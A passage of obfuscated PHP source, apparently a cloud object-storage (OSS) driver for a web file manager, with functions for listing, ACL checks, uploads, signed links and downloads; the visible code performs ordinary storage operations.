$this->pathThis($EÚÕ±ˆÇ°Û), $F–Š÷ƒàƒâ[75] => $this->getPathOuter($EÚÕ±ˆÇ°Û), $F–Š÷ƒàƒâ[29] => $F–Š÷ƒàƒâ[164], $F–Š÷ƒàƒâ[184] => 0, $F–Š÷ƒàƒâ[107] => 0, $F–Š÷ƒàƒâ[77] => 0, $F–Š÷ƒàƒâ[157] => $this->ext($EÚÕ±ˆÇ°Û), $F–Š÷ƒàƒâ[185] => !0, $F–Š÷ƒàƒâ[186] => !0); if (empty($c§¼ Î³†)) { $CŠéñœƒÌ‚ = $this->objectMeta($EÚÕ±ˆÇ°Û); if (!$CŠéñœƒÌ‚) { return $a³ÍÈÓ²ÌÌ; } $c§¼ Î³† = array($F–Š÷ƒàƒâ[107] => strtotime($CŠéñœƒÌ‚[$F–Š÷ƒàƒâ[1175]]), $F–Š÷ƒàƒâ[77] => $CŠéñœƒÌ‚[$F–Š÷ƒàƒâ[1176]] + 0); } goto cõÀë°ÄË’; cõÀë°ÄË’: if (isset($c§¼ Î³†[$F–Š÷ƒàƒâ[77]])) { $a³ÍÈÓ²ÌÌ[$F–Š÷ƒàƒâ[77]] = $c§¼ Î³†[$F–Š÷ƒàƒâ[77]]; } if (isset($c§¼ Î³†[$F–Š÷ƒàƒâ[107]])) { $a³ÍÈÓ²ÌÌ[$F–Š÷ƒàƒâ[107]] = $c§¼ Î³†[$F–Š÷ƒàƒâ[107]]; } if (isset($c§¼ Î³†[$F–Š÷ƒàƒâ[187]]) && !trim($a³ÍÈÓ²ÌÌ[$F–Š÷ƒàƒâ[107]])) { $a³ÍÈÓ²ÌÌ[$F–Š÷ƒàƒâ[107]] = $c§¼ Î³†[$F–Š÷ƒàƒâ[187]]; } goto eÊŸŠ¾Âì; eÊŸŠ¾Âì: return $a³ÍÈÓ²ÌÌ; goto cÂ½Æ³‡í; cÂ½Æ³‡í: } private function folderInfo($FñÓ×ïÁŸ†, $Bğøà†¼¶ = array()) { $aéØ´×á =& $_SERVER[¼]; $aÄ¹ñî™æİ = array($aéØ´×á[28] => $this->pathThis($FñÓ×ïÁŸ†), $aéØ´×á[75] => $this->getPathOuter($aéØ´×á[8] . $FñÓ×ïÁŸ†), $aéØ´×á[29] => $aéØ´×á[76], $aéØ´×á[184] => 0, $aéØ´×á[107] => 0, $aéØ´×á[185] => !0, $aéØ´×á[186] => !0); if (empty($Bğøà†¼¶)) { $FñÓ×ïÁŸ† = rtrim($FñÓ×ïÁŸ†, $aéØ´×á[8]) . $aéØ´×á[8]; $E‹ïŒš‚˜š = $this->objectMeta($FñÓ×ïÁŸ†); if (!$E‹ïŒš‚˜š) { return $aÄ¹ñî™æİ; } $Bğøà†¼¶ = array($aéØ´×á[184] => $E‹ïŒš‚˜š[$aéØ´×á[1177]][$aéØ´×á[1178]], $aéØ´×á[107] => strtotime($E‹ïŒš‚˜š[$aéØ´×á[1175]])); } if (isset($Bğøà†¼¶[$aéØ´×á[107]])) { $aÄ¹ñî™æİ[$aéØ´×á[107]] = $Bğøà†¼¶[$aéØ´×á[107]]; } if (isset($Bğøà†¼¶[$aéØ´×á[184]])) { $aÄ¹ñî™æİ[$aéØ´×á[184]] = $Bğøà†¼¶[$aéØ´×á[184]]; } return $aÄ¹ñî™æİ; } public function listPath($Eö‹ÎØÒÅâ, $c‰»Â¦¸ = false) { $f°‘ãÀä¹õ =& $_SERVER[¼]; $Dó‡†¤îÇÚ = $this->fileList($Eö‹ÎØÒÅâ, $f°‘ãÀä¹õ[8], !0); foreach ($Dó‡†¤îÇÚ[$f°‘ãÀä¹õ[74]] as $a‘¶ø÷ô‰° => $c›â±²˜²) { $Dó‡†¤îÇÚ[$f°‘ãÀä¹õ[74]][$a‘¶ø÷ô‰°] = $this->folderInfo($c›â±²˜², $c›â±²˜²); } foreach ($Dó‡†¤îÇÚ[$f°‘ãÀä¹õ[73]] as $a‘¶ø÷ô‰° => $c›â±²˜²) { $Dó‡†¤îÇÚ[$f°‘ãÀä¹õ[73]][$a‘¶ø÷ô‰°] = $this->fileInfo($c›â±²˜²[$f°‘ãÀä¹õ[28]], $c›â±²˜²); } return $Dó‡†¤îÇÚ; } public function has($Eù¼˜Ì¹…İ, $Dñ÷©ß×À = false, $Aï‡Å¢¼á = true) { goto fÊç³ºš¥§; e†îâ‚îÁ: $Bá¨ºÅµ°’ = 0; while (!0) { $Aß…‡¯ƒ‰ = array($fÌÙÍŞíÏ[1166] => $fÌÙÍŞíÏ[8], $fÌÙÍŞíÏ[183] => $BîĞ ÌèÍÓ, $fÌÙÍŞíÏ[1167] => $a‚“Òš©¨š, $fÌÙÍŞíÏ[1168] => $fß°×öùå›); try { $D‚‰ºÖŒ‡¬ = $this->client->listObjects($this->bucket, $Aß…‡¯ƒ‰); } catch (OSS\Core\OssException $FÑõÁİ¯·ã) { break; } $fß°×öùå› = $D‚‰ºÖŒ‡¬->getNextMarker(); $d“æÒÅ¤…Á = $D‚‰ºÖŒ‡¬->getObjectList(); $cï¡ÉÅ‚¼Ç = $D‚‰ºÖŒ‡¬->getPrefixList(); if ($Dñ÷©ß×À) { if (count($d“æÒÅ¤…Á) > 1 || count($d“æÒÅ¤…Á) == 1 && $d“æÒÅ¤…Á[0]->getKey() != $BîĞ ÌèÍÓ) { $dŒä…ì‰æ’ += count($d“æÒÅ¤…Á) - 1; } if (!empty($cï¡ÉÅ‚¼Ç)) { $Bá¨ºÅµ°’ += count($cï¡ÉÅ‚¼Ç); } if ($fß°×öùå› === $fÌÙÍŞíÏ[33]) { break; } continue; } if ($Aï‡Å¢¼á) { if (!empty($d“æÒÅ¤…Á)) { if (count($d“æÒÅ¤…Á) > 1 || $d“æÒÅ¤…Á[0]->getKey() != $BîĞ ÌèÍÓ) { return !0; } } } else { if (!empty($cï¡ÉÅ‚¼Ç)) { return !0; } } if ($fß°×öùå› === $fÌÙÍŞíÏ[33]) { break; } } if ($Dñ÷©ß×À) { return array($fÌÙÍŞíÏ[188] => $dŒä…ì‰æ’, $fÌÙÍŞíÏ[189] => $Bá¨ºÅµ°’); } goto D·‹Øè½; D·‹Øè½: return !1; goto Dñ«Âò²„×; fÊç³ºš¥§: $fÌÙÍŞíÏ =& $_SERVER[¼]; $Eù¼˜Ì¹…İ = trim($Eù¼˜Ì¹…İ, $fÌÙÍŞíÏ[8]); $BîĞ ÌèÍÓ = empty($Eù¼˜Ì¹…İ) ? $fÌÙÍŞíÏ[33] : $Eù¼˜Ì¹…İ . $fÌÙÍŞíÏ[8]; goto CÇìİ¬Ô; CÇìİ¬Ô: $fß°×öùå› = $fÌÙÍŞíÏ[33]; $a‚“Òš©¨š = 500; $dŒä…ì‰æ’ = 0; goto e†îâ‚îÁ; Dñ«Âò²„×: } public function listAll($eÀòãâÜ°İ) { $aÄä‹Œèï‘ =& $_SERVER[¼]; $eºìºÅ½Èã = $this->fileList($eÀòãâÜ°İ, $aÄä‹Œèï‘[33], !0); $FåãÏ‚¡¸Ì = array(); foreach ($eºìºÅ½Èã[$aÄä‹Œèï‘[73]] as $EíÀ”±ğ¥Ò) { $FåãÏ‚¡¸Ì[$EíÀ”±ğ¥Ò[$aÄä‹Œèï‘[28]]] = $EíÀ”±ğ¥Ò[$aÄä‹Œèï‘[77]]; } return $this->listAllFiles($eÀòãâÜ°İ, array_keys($FåãÏ‚¡¸Ì), $FåãÏ‚¡¸Ì); } public function canRead($fÂ±Ñ¥†ÖĞ) { $d…—¢á´å† =& $_SERVER[¼]; $FºÈì¸Œİ = $this->pathAcl($fÂ±Ñ¥†ÖĞ); return $FºÈì¸Œİ == $d…—¢á´å†[1179] || $FºÈì¸Œİ == $d…—¢á´å†[487] ? !0 : !1; } public function canWrite($F–àä…Ç¤ğ) { $A²ÎÑ”ª = $this->pathAcl($F–àä…Ç¤ğ); return $A²ÎÑ”ª == $_SERVER[¼][487] ? !0 : !1; } public function pathAcl($e·ƒ‹ïÕõ¼) { goto A«ç©Ø†éµ; A«ç©Ø†éµ: $bÓ°ÃÏë‹÷ =& $_SERVER[¼]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $CÅæ™ÕøÑò = $this->client->getObjectAcl($this->bucket, $this->pathEncode($e·ƒ‹ïÕõ¼)); } catch (OSS\Core\OssException $bØ«´µÁé) { return !1; } goto CÈõÁ¯ºÑ; CÈõÁ¯ºÑ: $cÈÉ”´°Şå = $CÅæ™ÕøÑò == $bÓ°ÃÏë‹÷[34] ? $this->bucketAcl : $CÅæ™ÕøÑò; if ($cÈÉ”´°Şå == $bÓ°ÃÏë‹÷[1180]) { return $bÓ°ÃÏë‹÷[1179]; } if ($cÈÉ”´°Şå == $bÓ°ÃÏë‹÷[1181]) { return $bÓ°ÃÏë‹÷[487]; } goto AßˆÖŸ“©–; AßˆÖŸ“©–: return $cÈÉ”´°Şå; goto d´¿ßÊ¢Œ; d´¿ßÊ¢Œ: } private function chmodPath($FãõÊ×™–ˆ, $b®’†ÔÛÀŸ = '') { $cµĞ»öŠ³ =& $_SERVER[¼]; $f±áÁ²ó = empty($b®’†ÔÛÀŸ) ? $cµĞ»öŠ³[1181] : $b®’†ÔÛÀŸ; $CĞî§Ç‘Ğ = array($cµĞ»öŠ³[34], $cµĞ»öŠ³[182], $cµĞ»öŠ³[1180], $cµĞ»öŠ³[1181]); if (!in_array($f±áÁ²ó, $CĞî§Ç‘Ğ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($FãõÊ×™–ˆ), $f±áÁ²ó); } catch (OSS\Core\OssException $B…ˆªŞõ¦Õ) { return !1; } return !0; } public function getContent($cÖ¨Ş¬–÷¡) { return $this->fileSubstr($cÖ¨Ş¬–÷¡, -1); } public function setContent($CĞÖ­»µ», $DìÉ‡£ßÜƒ = '') { $d¬™á¹—œ‡ =& $_SERVER[¼]; try { $BçÚÑ¨ö†Â = $this->trafficLimit($d¬™á¹—œ‡[1182]); $B“Ñø÷ÆĞ¼ = $this->client->putObject($this->bucket, $this->pathEncode($CĞÖ­»µ»), $DìÉ‡£ßÜƒ, $BçÚÑ¨ö†Â); } catch (OSS\Core\OssException $F¼§ˆ¥£öï) { return !1; } $F…Ğİº§Şƒ = array($d¬™á¹—œ‡[1169] => trim($B“Ñø÷ÆĞ¼[$d¬™á¹—œ‡[1183]], $d¬™á¹—œ‡[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CĞÖ­»µ»))); $this->updateObjMeta($CĞÖ­»µ», $F…Ğİº§Şƒ); return isset($B“Ñø÷ÆĞ¼[$d¬™á¹—œ‡[1184]][$d¬™á¹—œ‡[1131]]) ? (int) $B“Ñø÷ÆĞ¼[$d¬™á¹—œ‡[1184]][$d¬™á¹—œ‡[1131]] : strlen($B“Ñø÷ÆĞ¼); } private function updateObjMeta($fîÎ“¡ˆ¹½, $AÄ‹µ¨—Êõ) { $fîÎ“¡ˆ¹½ = $this->pathEncode($fîÎ“¡ˆ¹½); try { $AÎİŒè´Ş™ = array(OSS\OssClient::OSS_HEADERS => $AÄ‹µ¨—Êõ); $this->client->copyObject($this->bucket, $fîÎ“¡ˆ¹½, $this->bucket, $fîÎ“¡ˆ¹½, $AÎİŒè´Ş™); } catch (OSS\Core\OssException $A’¯ëğÖ’£) { return !1; } return !0; } public function upload($D»’›ÃÕ‰œ, $f§¦¢µ¬õ, $cé¸À©œ¹ñ = false, $b¢¨ÕÕ½Ø¢ = REPEAT_REPLACE) { $aŠÊ¤º÷¤ =& $_SERVER[¼]; $AŒãéÃÎ‘¨ = trim($D»’›ÃÕ‰œ, $aŠÊ¤º÷¤[8]); $aùµßÛÒ»¢ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($aŠÊ¤º÷¤[1169] => @md5_file($f§¦¢µ¬õ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D»’›ÃÕ‰œ))); $aùµßÛÒ»¢ = $this->trafficLimit($aŠÊ¤º÷¤[1182], $aùµßÛÒ»¢); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($AŒãéÃÎ‘¨), $f§¦¢µ¬õ, $aùµßÛÒ»¢); } catch (OSS\Core\OssException $Ešš²¢ôÑ«) { return !1; } return $this->getPathOuter($D»’›ÃÕ‰œ); } public function getHost() { $Eªò¨ŞÆ¢Š =& $_SERVER[¼]; $dÂİ†äæõÃ = explode($Eªò¨ŞÆ¢Š[168], parent::getHost()); return $dÂİ†äæõÃ[0] . $Eªò¨ŞÆ¢Š[168] . $this->bucket . $Eªò¨ŞÆ¢Š[93] . $dÂİ†äæõÃ[1]; } public function uploadFormData($eÈòÕ±¦ó, $f¼ÛÚÀ‰à = 3600) { goto B§³øœÒ; Aáª£ÍÉÛ: return $AîÛ¯Ó»±; goto fœ¸Ô‘Ù«ß; B§³øœÒ: $c‘© ÊªÓ› =& $_SERVER[¼]; if (!($F†ÊÖ´‹ = $this->getHost())) { return !1; } $D˜šä´ğ‘— = $f¼ÛÚÀ‰à; goto C¤ÆƒœÙ²³; F‰šÛ½â˜ø: $d÷öÆÍïÂ = strpos($F¨º»ôëÓ, $c‘© ÊªÓ›[281]); $F¨º»ôëÓ = substr($F¨º»ôëÓ, 0, $d÷öÆÍïÂ) . $c‘© ÊªÓ›[1186]; $A¾¾·ƒàÓœ = 1048576000 * 5; goto e§°—¹ØÎÆ; eŞ³«©Œ½: $fÃì®ÉÈ…Ø = base64_encode(hash_hmac($c‘© ÊªÓ›[215], $eéÆÛßØ³¼, $this->secret, !0)); $AîÛ¯Ó»± = array($c‘© ÊªÓ›[1098] => $eéÆÛßØ³¼, $c‘© ÊªÓ›[1188] => $this->accessKey, $c‘© ÊªÓ›[1094] => $c‘© ÊªÓ›[1086], $c‘© ÊªÓ›[1189] => $fÃì®ÉÈ…Ø, $c‘© ÊªÓ›[166] => $F†ÊÖ´‹); $AîÛ¯Ó»± = $this->trafficLimit($c‘© ÊªÓ›[1182], $AîÛ¯Ó»±); goto Aáª£ÍÉÛ; e§°—¹ØÎÆ: $cå–è‘Û¼ = $this->pathFather($eÈòÕ±¦ó); $DŒßÇô·Ş¿ = array($c‘© ÊªÓ›[1088] => $F¨º»ôëÓ, $c‘© ÊªÓ›[1089] => array(array($c‘© ÊªÓ›[1187], 0, $A¾¾·ƒàÓœ), array($c‘© ÊªÓ›[1092], $c‘© ÊªÓ›[1093], $cå–è‘Û¼))); $eéÆÛßØ³¼ = base64_encode(json_encode($DŒßÇô·Ş¿)); goto eŞ³«©Œ½; C¤ÆƒœÙ²³: $EêÔó„°— = date($c‘© ÊªÓ›[1185], time() + $D˜šä´ğ‘—); $cîï×ğôÖ = new DateTime($EêÔó„°—); $F¨º»ôëÓ = $cîï×ğôÖ->format(DateTime::ISO8601); goto F‰šÛ½â˜ø; fœ¸Ô‘Ù«ß: } public function multiUploadFormData($f²î¸ñ¿Æƒ, $BÁÉªƒÕ· = 3600) { $bÑ¾…éàĞ =& $_SERVER[¼]; if (!($FÇ¡ÕÔªóŠ = $this->getHost())) { return !1; } $eƒ˜Äš½À© = $this->trafficLimit($bÑ¾…éàĞ[1182]); $DæÃÁÜ’˜ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($f²î¸ñ¿Æƒ), $eƒ˜Äš½À©); return array($bÑ¾…éàĞ[206] => $DæÃÁÜ’˜, $bÑ¾…éàĞ[166] => $FÇ¡ÕÔªóŠ . $bÑ¾…éàĞ[8] . $this->pathEncode($f²î¸ñ¿Æƒ), $bÑ¾…éàĞ[207] => gmdate($bÑ¾…éàĞ[1190]), $bÑ¾…éàĞ[89] => $f²î¸ñ¿Æƒ); } public function multiUploadAuthData($eïÛ•áœ¸¾, $eÑ¬ÛÙœ¯Ä = array()) { goto E²õåÀ—Ê; bÇê¦°Ä‚: $bÚ¦ìêäè‚ = array($E©°õ…Ğè½[209], $E©°õ…Ğè½[33], $E©°õ…Ğè½[116], $fÅ¬ÈÁ„ä†, "\x78\55\157\163\163\55\x64\141\x74\x65\x3a{$fÅ¬ÈÁ„ä†}", $E©°õ…Ğè½[8] . $this->bucket . $E©°õ…Ğè½[8] . $CÉÓº¦Ãİù . $A´¨®ïæù); if (strpos($A´¨®ïæù, $E©°õ…Ğè½[210]) === 0) { $bÚ¦ìêäè‚[0] = $E©°õ…Ğè½[211]; if ($aØŸ„²çò = $this->trafficLimit($E©°õ…Ğè½[1182])) { $CÉÓº¦Ãİù = $E©°õ…Ğè½[1191]; array_splice($bÚ¦ìêäè‚, 5, 0, $CÉÓº¦Ãİù . $E©°õ…Ğè½[4] . $aØŸ„²çò[$CÉÓº¦Ãİù]); } } if (isset($eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[212]]) && $eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[212]] == $E©°õ…Ğè½[213]) { $bÚ¦ìêäè‚[0] = $E©°õ…Ğè½[213]; } goto C´±½±•¸; FÆÁÔäœ×ë: $b¹êµ²ã‚ = $E©°õ…Ğè½[1193] . $this->accessKey . $E©°õ…Ğè½[4] . $fÜÊ—öëÎâ; if (strpos($A´¨®ïæù, $E©°õ…Ğè½[210]) === 0) { $b¹êµ²ã‚ = array($E©°õ…Ğè½[217] => $b¹êµ²ã‚, $E©°õ…Ğè½[207] => $fÅ¬ÈÁ„ä†); if ($aØŸ„²çò) { $b¹êµ²ã‚ = array_merge($b¹êµ²ã‚, $aØŸ„²çò); } } return $b¹êµ²ã‚; goto E¢Ï¥“Ü”; A‰î”†òô§: $CÉÓº¦Ãİù = $eïÛ•áœ¸¾; if (isset($eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[89]])) { $CÉÓº¦Ãİù = $eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[89]]; unset($eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[89]]); } if (isset($eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[208]])) { $eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[207]] = $fÅ¬ÈÁ„ä†; return $this->listUploadParts($CÉÓº¦Ãİù, $eÑ¬ÛÙœ¯Ä); } goto bÇê¦°Ä‚; E²õåÀ—Ê: $E©°õ…Ğè½ =& $_SERVER[¼]; $fÅ¬ÈÁ„ä† = isset($eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[207]]) ? $eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[207]] : gmdate($E©°õ…Ğè½[1190]); $A´¨®ïæù = isset($eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[157]]) ? $eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[157]] : $E©°õ…Ğè½[33]; goto A‰î”†òô§; C´±½±•¸: if (!empty($eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[1192]])) { $càé‹ŒØ¯ = array_merge(array($bÚ¦ìêäè‚[4]), $eÑ¬ÛÙœ¯Ä[$E©°õ…Ğè½[1192]]); sort($càé‹ŒØ¯); $bÚ¦ìêäè‚[4] = implode($E©°õ…Ğè½[214], $càé‹ŒØ¯); } $b†Ú—‰…æŒ = implode($E©°õ…Ğè½[214], $bÚ¦ìêäè‚); $fÜÊ—öëÎâ = base64_encode(hash_hmac($E©°õ…Ğè½[215], $b†Ú—‰…æŒ, $this->secret, !0)); goto FÆÁÔäœ×ë; E¢Ï¥“Ü”: } public function listUploadParts($B·‚ŸœšÂ§, $eòÑ‚À˜ÕÛ) { goto B±…·‡ÖÑŞ; cÈ¿èÑ®©: unset($eòÑ‚À˜ÕÛ[$C“¸òÒÅƒº[208]], $eòÑ‚À˜ÕÛ[$C“¸òÒÅƒº[212]]); $bùªôŠŒ‡‹ = $this->multiUploadAuthData($B·‚ŸœšÂ§, $eòÑ‚À˜ÕÛ); if (empty($bùªôŠŒ‡‹)) { return !1; } goto b¿Ë·Ö‹á«; b¿Ë·Ö‹á«: return array($C“¸òÒÅƒº[217] => $bùªôŠŒ‡‹, $C“¸òÒÅƒº[207] => $eòÑ‚À˜ÕÛ[$C“¸òÒÅƒº[207]], $C“¸òÒÅƒº[219] => $CíƒŒ¼Š²); goto a‹‹Ä£óÄÓ; F›¦Î‘Óä—: $D³ë«…Ø…è = $f–é£‚õÖÆ->getListPart(); $CíƒŒ¼Š² = array(); foreach ($D³ë«…Ø…è as $b°å£³á¿) { $CíƒŒ¼Š²[] = array($C“¸òÒÅƒº[1173] => $b°å£³á¿->getPartNumber(), $C“¸òÒÅƒº[1174] => trim($b°å£³á¿->getETag(), $C“¸òÒÅƒº[113])); } goto cÈ¿èÑ®©; B±…·‡ÖÑŞ: $C“¸òÒÅƒº =& $_SERVER[¼]; $EóÃåÜà¿‹ = parse_url_query($eòÑ‚À˜ÕÛ[$C“¸òÒÅƒº[157]]); $f–é£‚õÖÆ = $this->client->listParts($this->bucket, $this->pathEncode($B·‚ŸœšÂ§), $EóÃåÜà¿‹[$C“¸òÒÅƒº[206]]); goto F›¦Î‘Óä—; a‹‹Ä£óÄÓ: } public function download($d×©Æ¦ŠÂò, $D­ØŒ‡Áˆ‹) { if ($this->isFolder($d×©Æ¦ŠÂò)) { return !1; } try { $DïÖ¬Æ´Û = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $D­ØŒ‡Áˆ‹); $DïÖ¬Æ´Û = $this->trafficLimit($_SERVER[¼][105], $DïÖ¬Æ´Û); $this->client->getObject($this->bucket, $this->pathEncode($d×©Æ¦ŠÂò), $DïÖ¬Æ´Û); } catch (OSS\Core\OssException $CŞ·ç¬…å¸) { return !1; } return $D­ØŒ‡Áˆ‹; } public function fileSubstr($fÃçä§„ñİ, $Dó†‡««ò = 0, $C¥Ó¨‡ÈÑß = false) { if ($Dó†‡««ò === -1) { $E¦¢£­£Ô² = array(); } else { if ($C¥Ó¨‡ÈÑß === !1) { $fœÔƒî‘Ç = $this->size($fÃçä§„ñİ); } else { $fœÔƒî‘Ç = $Dó†‡««ò + $C¥Ó¨‡ÈÑß - 1; } $E¦¢£­£Ô² = array(OSS\OssClient::OSS_RANGE => "{$Dó†‡««ò}\x2d{$fœÔƒî‘Ç}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($fÃçä§„ñİ), $E¦¢£­£Ô²); } catch (OSS\Core\OssException $AéÂä¡äœ) { think_exception($AéÂä¡äœ->getMessage()); return !1; } } private function trafficLimit($C‰Ö×½Ô, $e—‚¢î…Ä = array()) { goto AŞ‘Ÿøª¥; AŞ‘Ÿøª¥: $dÁ­ì´™î¼ =& $_SERVER[¼]; if ($C‰Ö×½Ô == $dÁ­ì´™î¼[1182] && $this->isUploadServer() || $C‰Ö×½Ô == $dÁ­ì´™î¼[105] && $this->isFileOutServer()) { return $e—‚¢î…Ä; } $eˆİ­Øç×­ = floatval($GLOBALS[$dÁ­ì´™î¼[6]][$dÁ­ì´™î¼[84]][$dÁ­ì´™î¼[91]][$C‰Ö×½Ô]) * 1024 * 1024 * 8; goto AÖ‰ˆèŒŒÂ; AÖ‰ˆèŒŒÂ: if (!$eˆİ­Øç×­) { return $e—‚¢î…Ä; } $eˆİ­Øç×­ = $eˆİ­Øç×­ < 819200 ? 819200 : ($eˆİ­Øç×­ > 838860800 ? 838860800 : $eˆİ­Øç×­); $e—‚¢î…Ä[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($eˆİ­Øç×­); goto fŒ°ìˆˆÅ„; fŒ°ìˆˆÅ„: return $e—‚¢î…Ä; goto bŒàŒê‚¦; bŒàŒê‚¦: } public function link($c±±ä»øºÅ, $Cã…ÚÅßœÉ = array()) { $CÄ“‹ƒÄ±‹ =& $_SERVER[¼]; if (!$this->exist($c±±ä»øºÅ) || $this->isFolder($c±±ä»øºÅ)) { return !1; } try { $Cã…ÚÅßœÉ = $this->trafficLimit($CÄ“‹ƒÄ±‹[105], $Cã…ÚÅßœÉ); $DÙˆªÕ÷´“ = $this->client->signUrl($this->bucket, $this->pathEncode($c±±ä»øºÅ), 3600 * 12, $CÄ“‹ƒÄ±‹[213], $Cã…ÚÅßœÉ); return $this->getCdnLink($DÙˆªÕ÷´“); } catch (OSS\Core\OssException $Dğ¤‡ÜÎœ) { return !1; } } public function fileOut($Aßß’½À¡, $aß¨ ·ÉçÍ = false, $Dæ¹Ê»ø‹œ = false, $BøäÏ­íİ = '') { goto e¢Í³×íµ; e¢Í³×íµ: $AóÍï„¬ç =& $_SERVER[¼]; if (!$Dæ¹Ê»ø‹œ) { $Dæ¹Ê»ø‹œ = $this->pathThis($Aßß’½À¡); } $Dæ¹Ê»ø‹œ = rawurlencode($Dæ¹Ê»ø‹œ); goto A˜Ê¯ˆŞÊ; bã­ãÛô“ğ: $BÖ‘¸­•ƒ = array(OSS\OssClient::OSS_SUB_RESOURCE => $AóÍï„¬ç[1194] . rawurlencode("{$aß¨ ·ÉçÍ}\73\x66\151\154\145\156\x61\x6d\x65\x3d{$Dæ¹Ê»ø‹œ}")); $BÖ‘¸­•ƒ[OSS\OssClient::OSS_SUB_RESOURCE] .= $AóÍï„¬ç[1195] . $dŒîŠïˆğ; $AéÆ÷¨®šÜ = $this->link($Aßß’½À¡, $BÖ‘¸­•ƒ); goto cëƒ¢Äñ­¨; A˜Ê¯ˆŞÊ: $dŒîŠïˆğ = get_file_mime(get_path_ext($Dæ¹Ê»ø‹œ)); if ($dŒîŠïˆğ == $AóÍï„¬ç[198]) { return parent::fileOut($Aßß’½À¡, $aß¨ ·ÉçÍ, $Dæ¹Ê»ø‹œ, $BøäÏ­íİ); } $aß¨ ·ÉçÍ = $aß¨ ·ÉçÍ ? $AóÍï„¬ç[199] : $AóÍï„¬ç[200]; goto bã­ãÛô“ğ; cëƒ¢Äñ­¨: $this->fileOutLink($AéÆ÷¨®šÜ); goto f®±†’íåÎ; f®±†’íåÎ: } public function fileOutServer($DªŠê©‚ª, $C•ƒóá°ÕÀ = false, $E£ÌŸë»…º = false, $D„‡äñÆ­µ = '') { parent::fileOut($DªŠê©‚ª, $C•ƒóá°ÕÀ, $E£ÌŸë»…º, $D„‡äñÆ­µ); } public function fileOutImage($D¨£»¹¯˜˜, $D„’„×ç× = 250) { $CÂ½šøø‘± = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¼][1196] . $D„’„×ç×); $Cç‘²Ö’ò = $this->link($D¨£»¹¯˜˜, $CÂ½šøø‘±); $this->fileOutLink($Cç‘²Ö’ò); } public function fileOutImageServer($Dù“Úé‹—, $c‘öªÉôÜ = 250) { parent::fileOutImage($Dù“Úé‹—, $c‘öªÉôÜ); } public function fileOutLink($fŒğÑÃå‡Õ) { $A·‰µöÇ¡Æ =& $_SERVER[¼]; if (!$this->isCdnHost() && substr($fŒğÑÃå‡Õ, 0, 7) == $A·‰µöÇ¡Æ[1101]) { $fŒğÑÃå‡Õ = $A·‰µöÇ¡Æ[1102] . substr($fŒğÑÃå‡Õ, 7); } header($A·‰µöÇ¡Æ[153] . $fŒğÑÃå‡Õ); die; } public function hashMd5($a¥è©ô“æß, $B·ÉÉÃâ¤ = '') { $eò ÷†‘§õ =& $_SERVER[¼]; $DØÀËïÏó = $this->objectMeta($a¥è©ô“æß); if (!$DØÀËïÏó) { return $eò ÷†‘§õ[33]; } if (!isset($DØÀËïÏó[$eò ÷†‘§õ[1169]]) && !empty($B·ÉÉÃâ¤)) { $F²ã¨õù† = $this->updateObjMeta($a¥è©ô“æß, array($eò ÷†‘§õ[1169] => $B·ÉÉÃâ¤)); $DØÀËïÏó[$eò ÷†‘§õ[1169]] = $F²ã¨õù† ? $B·ÉÉÃâ¤ : $eò ÷†‘§õ[33]; } return isset($DØÀËïÏó[$eò ÷†‘§õ[1169]]) ? strtolower($DØÀËïÏó[$eò ÷†‘§õ[1169]]) : $eò ÷†‘§õ[33]; } public function size($Fšîğõ‡Ëà) { $FÛÛßµ§–« = $this->objectMeta($Fšîğõ‡Ëà); return $FÛÛßµ§–« ? $FÛÛßµ§–«[$_SERVER[¼][77]] : 0; } public function info($dœÌÙ…âçŞ) { if ($this->isFolder($dœÌÙ…âçŞ)) { return $this->folderInfo($dœÌÙ…âçŞ); } else { if ($this->isFile($dœÌÙ…âçŞ)) { return $this->fileInfo($dœÌÙ…âçŞ); } } return !1; } public function exist($e¶óëšÔó‚) { return $this->isFile($e¶óëšÔó‚) || $this->isFolder($e¶óëšÔó‚); } public function isFile($câùœ…ã) { return !$this->isFolder($câùœ…ã) && $this->objectMeta($câùœ…ã); } public function isFolder($D—œğ­Ù÷˜) { return $this->cacheMethod($_SERVER[¼][220], $D—œğ­Ù÷˜); } protected function objectMeta($F°ÂÇ¢Ù¿¡) { return $this->cacheMethod($_SERVER[¼][221], $F°ÂÇ¢Ù¿¡); } protected function _objectMeta($C¤³õÈçÄ…) { $eïÔà†ª« =& $_SERVER[¼]; try { $e¢ÈŒËÃ­» = $this->client->getObjectMeta($this->bucket, $this->pathEncode($C¤³õÈçÄ…)); } catch (OSS\Core\OssException $F†®ï…Ÿ) { $e¢ÈŒËÃ­» = !1; } if ($e¢ÈŒËÃ­») { $e¢ÈŒËÃ­»[$eïÔà†ª«[77]] = intval($e¢ÈŒËÃ­»[$eïÔà†ª«[1176]]); } return $e¢ÈŒËÃ­»; } protected function _isFolder($fß²¦•¼Š¹) { $d‡ÓÆÕøÑ =& $_SERVER[¼]; if ($fß²¦•¼Š¹ == $d‡ÓÆÕøÑ[33] || $fß²¦•¼Š¹ == $d‡ÓÆÕøÑ[8]) { return !0; } $b±âÜºï®÷ = array($d‡ÓÆÕøÑ[1166] => $d‡ÓÆÕøÑ[8], $d‡ÓÆÕøÑ[183] => rtrim($fß²¦•¼Š¹, 